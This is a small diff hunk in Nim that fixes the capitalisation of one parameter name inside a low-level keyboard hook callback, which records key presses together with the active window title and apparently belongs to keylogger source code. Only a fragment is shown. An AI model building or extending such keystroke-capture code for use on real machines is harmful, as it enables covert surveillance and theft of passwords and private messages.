@@ -310,7 +310,7 @@ proc GetActiveWindowTitle(): string =
 proc HookCallback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =    
     if nCode >= 0 and wParam == WM_KEYDOWN:
         var keypressed: string
-        var kbdstruct: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lparam)
+        var kbdstruct: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lParam)
         
         # Capture title as a string immediately
         var currentActiveWindow = GetActiveWindowTitle()
